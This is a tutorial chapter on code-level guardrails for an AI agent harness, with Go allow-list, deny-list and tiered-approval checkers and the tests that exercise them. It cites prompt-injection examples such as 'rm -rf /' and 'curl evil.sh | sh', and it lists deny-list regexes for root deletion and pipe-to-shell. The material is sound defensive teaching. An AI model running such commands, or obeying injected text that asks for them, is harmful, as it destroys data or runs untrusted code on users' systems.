# s06 — Guardrails

> The code-level gate between "the model asked for X" and "the harness did X". Three modes — allow-list, deny-list, tiered approval — wired through a single `Checker` interface and a `Guarded()` wrapper that the loop calls instead of the tool registry directly.

## Problem

s03 built a tool registry that dispatches whatever name the model emits. That is the right shape for a developer prototype and exactly the wrong shape for anything that touches a real filesystem. The threat is straightforward:

> The model generates text. That text includes tool calls. The harness executes those tool calls. This means anything that influences the model's output can influence what the harness does — including malicious content in files, web pages, or user messages.
> — `guide/guardrails.md` L11

A prompt injection in a webpage the agent reads can ask for `rm -rf /`, `curl evil.sh | sh`, or `git push --force origin main`. The s03 registry has no opinion about any of that; it sees a string `name` and a JSON `args` blob and dispatches. So we need a layer that:

1. inspects the *parsed* tool call (after the model emits it, before the registry runs it),
2. makes a yes/no/needs-approval decision from declarative policy,
3. makes the "never dispatched" case **structurally** unreachable on a block — not merely a convention the test suite happens to enforce.

A guardrail in the prompt ("you are a helpful assistant who never deletes files") does none of this. Upstream calls that out explicitly in L150: "Telling the model 'don't delete files' is not a guardrail. The model can be overridden by prompt injection."

## Solution

A `Checker` interface that returns a `Decision`, plus a `Guarded()` higher-order function that wraps a `DispatchFunc` with that check. Three implementations of `Checker` covering the three permission models from `guardrails.md` L51-L116:

| Mode | Default | Rejection signal | Best fit |
|------|---------|------------------|----------|
| Allow-list (`AllowListChecker`) | Deny | `Decision{Allow:false}` | Managed agents, hosted demos |
| Deny-list (`DenyListChecker`) | Allow | `Decision{Allow:false}` | Developer tools, hard to enumerate |
| Tiered (`TieredChecker`) | Allow (low/med/high) | `ErrNeedsApproval` for critical | Mixed-risk surfaces |

The three checkers all consume the same `Policy` struct (`policy.go`); they just look at different fields. That means an operator can ship one JSON file and feature-flag which mode to wear today.

The wrapper itself is twenty lines:

```go
func Guarded(checker Checker, dispatch DispatchFunc) DispatchFunc {
    return func(name string, args map[string]any) string {
        decision, err := checker.Check(name, args)
        if err != nil {
            if errors.Is(err, ErrNeedsApproval) {
                return fmt.Sprintf("Error: needs human approval (tier=%s)", decision.Tier)
            }
            return fmt.Sprintf("Error: guardrail check failed: %v", err)
        }
        if !decision.Allow {
            return fmt.Sprintf("Error: blocked by guardrail: %s", decision.Reason)
        }
        return dispatch(name, args)
    }
}
```

The crucial line is the *absence* of a call to `dispatch` in any path that returns an error string. The compiler can prove the inner function isn't reached. That is what "guardrails in code" buys you over "guardrails in the prompt".

## How It Works

### Allow-list

Strict mode. The Python in `guardrails.md` L57-L72 reads:

```python
def check_permission(tool_name, args):
    if tool_name not in ALLOWED_TOOLS:
        return False
    policy = ALLOWED_TOOLS[tool_name]
    if "paths" in policy:
        return any(fnmatch(args.get("path", ""), p) for p in policy["paths"])
    ...
```

We split that into two policy fields (`AllowedTools` and `AllowedPathGlobs`) so the Go API doesn't need a nested-dict scheme, and we ship a tiny glob matcher in `allowlist.go` that understands `*` (within a segment) and `**` (across segments). `/workspace/**` matches `/workspace/a/b/c.txt` but not `/etc/passwd` and not `/workspace` itself (the trailing `/` is part of the prefix).

Two design choices worth flagging:

1. **No path globs ⇒ no path constraint.** If `AllowedPathGlobs` is empty, the tool is allowed unconditionally as long as it's listed. This keeps the policy compositional — a "list_models" tool that takes no path isn't accidentally blocked by a policy that only mentions globs.
2. **Tools without a `path` arg skip the glob check.** Mirrors the upstream `if "paths" in policy` guard. If a future tool takes a `target_path` arg instead, the policy author would extend the checker or rename the arg — we don't over-generalise.

### Deny-list

Permissive mode. Each entry in `policy.BlockedPatterns` is a Go `regexp`. We match against a *canonical* form of args:

- if `args["command"]` is a string, use that verbatim — most shell-risk patterns are written against shell syntax (upstream L86-L90).
- otherwise concatenate every string-valued arg in stable key order so the regex still has something to scan.

Regexes are compiled lazily (`sync.Once`) and cached. A regex that won't compile is fatal but *silent in code* — `Decision.Allow=false` with a reason naming the bad pattern. Fail-closed: a broken policy must not silently widen the trust boundary.

Two of the upstream examples (L80-L83) become test cases verbatim:

- `rm\s+-rf\s+/` — root deletion
- `curl.*\|\s*sh` — pipe-to-shell

We deliberately *don't* ship the third upstream example (`env\s+|printenv|echo\s+\$`) — it's broader than the chapter's pedagogy needs and conflates "exposes env vars" with the regex `\$` which matches almost any shell variable. Reproducing the upstream-as-cookbook is not the goal; reproducing the *shape* of the matcher is.

### Tiered

Risk-bucketing. `policy.ToolTiers["git_push_force"] = "critical"` causes the tiered checker to return `ErrNeedsApproval` on that tool, regardless of args. Lower tiers return `Decision{Allow:true}` with a Reason that distinguishes "low risk, auto-approved" from "high risk, approved (require external review)".

The interesting thing is *what* gets returned for critical:

```go
return Decision{Allow: false, Tier: TierCritical, Reason: "..."}, ErrNeedsApproval
```

The error is the load-bearing signal. The wrapper's `errors.Is(err, ErrNeedsApproval)` check produces a *different error string* than a plain block — `"Error: needs human approval (tier=critical)"`. A UI that wants to put up an approval dialog can string-match on that prefix without parsing structured output back from the model loop. The Tier on the Decision is bait for the formatter; the err is the routing signal.

We deliberately treat `high` as auto-approve-with-logging in this chapter. Upstream's table (L101) says "Require human approval" for high, but the *mechanism* for that approval is application-specific (a UI, a Slackbot, an out-of-band CLI). Shipping a half-baked "high also returns ErrNeedsApproval" would conflate that policy decision with the structural piece. Real deployments override the tiered checker or chain it with a UI prompt for high.

## What Changed

| | s05 (memory) | s06 (guardrails) |
|---|---|---|
| Position relative to loop | runs at startup + during run | runs **between** model output and tool dispatch |
| Storage | files on disk | nothing — pure policy evaluation |
| What it produces | a context-window snippet | a yes/no decision |
| Failure mode | "memory not loaded" — degrades to no memory | "policy says no" — blocks dispatch |

s06 introduces no persistent state. It is the only chapter so far whose entire footprint is a function transformation: `(Checker, DispatchFunc) → DispatchFunc`. That composability is the whole point — you can drop `Guarded(checker, registry.Dispatch)` into the loop with one line of wiring and ship.

Concretely, s_full will wire it like this:

```go
// in s_full
dispatch := registry.Dispatch                  // s03
dispatch  = Guarded(allowListChecker, dispatch) // s06
dispatch  = Guarded(denyListChecker,  dispatch) // s06, stacked
```

The two checkers stack — both must allow for the call to land. The wrapper's contract makes that trivial: a `Guarded()` is itself a `DispatchFunc`, so you can wrap it again.

## Try It

```bash
cd agents/s06-guardrails
go test -count=1 ./...
# PASS — 7 tests:
#   TestAllowList_BlocksUnknownTool
#   TestAllowList_PathGlobs
#   TestDenyList_BlocksRmRf
#   TestDenyList_BlocksCurlPipeShell
#   TestTiered_CriticalReturnsNeedsApproval
#   TestGuarded_PassesThroughOnAllow
#   TestGuarded_BlocksAndReturnsString

go run .
# === AllowListChecker ===
# [dispatched] read_file(map[path:/workspace/main.go])
# Error: blocked by guardrail: path "/etc/passwd" does not match any allowed glob [/workspace/**]
# Error: blocked by guardrail: tool "delete_file" is not in the allow-list
#
# === DenyListChecker ===
# [dispatched] run_command(map[command:ls -la])
# Error: blocked by guardrail: argument matched blocked pattern "rm\\s+-rf\\s+/"
# Error: blocked by guardrail: argument matched blocked pattern "rm\\s+-rf\\s+/"
# Error: blocked by guardrail: argument matched blocked pattern "curl.*\\|\\s*sh"
#
# === TieredChecker ===
# [dispatched] read_file(map[path:/anywhere])
# [dispatched] write_file(map[path:/anywhere])
# [dispatched] run_command(map[command:make test])
# Error: needs human approval (tier=critical)
```

The `[dispatched]` prefix in the output is the fake DispatchFunc — every line with that prefix is one that the inner function actually saw. Every `Error:` line is one the wrapper short-circuited. Visually scan the demo output: blocks have no corresponding dispatch line. That's the invariant `TestGuarded_BlocksAndReturnsString` pins.

## Upstream Source Reading

Source: `guide/guardrails.md` L22-L116. Permalink: <https://github.com/nexu-io/harness-engineering-guide/blob/86fec9bea430cecb29ff10afaae36b96496a8f8e/guide/guardrails.md#L22-L116>

```python
# guardrails.md L57-L72 — allow-list
ALLOWED_TOOLS = {
    "read_file": {"paths": ["/workspace/**"]},
    "write_file": {"paths": ["/workspace/**"]},
    "run_command": {"commands": ["npm test", "npm run build"]},
}

def check_permission(tool_name, args):
    if tool_name not in ALLOWED_TOOLS:
        return False
    policy = ALLOWED_TOOLS[tool_name]
    if "paths" in policy:
        return any(fnmatch(args.get("path", ""), p) for p in policy["paths"])
    if "commands" in policy:
        return args.get("command") in policy["commands"]
    return True
```

Reading notes:

- **The upstream allow-list is *nested* — `ALLOWED_TOOLS[name] -> {paths|commands}`.** Our Go version flattens that into `Policy.AllowedTools` (set membership) + `Policy.AllowedPathGlobs` (single shared glob list). The trade-off: simpler JSON, but every allow-listed tool shares the same path scope. A future extension is a `map[string][]string` for per-tool globs.
- **`fnmatch` is shell-style, not full regex.** `**` is a doublestar extension in Python's `fnmatch` (technically not in the stdlib — the upstream sketch assumes a library or wrapper). We ship our own three-token matcher (`*`, `**`, literal) because pulling in a glob dependency for one feature would dwarf the chapter.
- **`return True` at L72 is the trap.** A tool with no `paths` and no `commands` policy gets blanket approval. Our port preserves that *only* when no path globs are configured at all — the moment you add a glob, even an unrelated tool's path arg gets checked. The opposite default (require an explicit pass-through) would be safer; we kept upstream semantics for pedagogy.
- **Deny-list patterns are *substrings*, not anchored.** Upstream uses `re.search`, not `re.fullmatch`. Go's `regexp.MatchString` is `re.search`-equivalent, so `rm -rf /tmp/x` matches `rm\s+-rf\s+/` because of the `/` in `/tmp/`. That's a feature, not a bug — but it means deny-list patterns are *signatures*, not *grammars*. Don't try to write a shell parser as a regex.
- **The tiered table (L96-L116) is illustrative, not prescriptive.** Upstream uses substring checks (`if "rm" in cmd`); we use a per-tool tier map because we already have a tool registry. A real classifier (s14) replaces this whole approach.

Reading map:

| Topic | Upstream file | Lines | Mapped chapter |
|-------|---------------|-------|----------------|
| Trust boundary diagram | `guide/guardrails.md` | L22-L49 | s06 (this) |
| Allow-list | `guide/guardrails.md` | L51-L73 | s06 |
| Deny-list | `guide/guardrails.md` | L75-L91 | s06 |
| Tiered approval | `guide/guardrails.md` | L93-L116 | s06 |
| Sandboxing (OS-level isolation) | `guide/guardrails.md` | L118-L131 | (out of scope; linked) |
| Input sanitisation | `guide/guardrails.md` | L133-L145 | (touched in s09) |
| Model-based classifier (replaces static rules) | `guide/classifier-permissions.md` | L29-L169 | s14 |
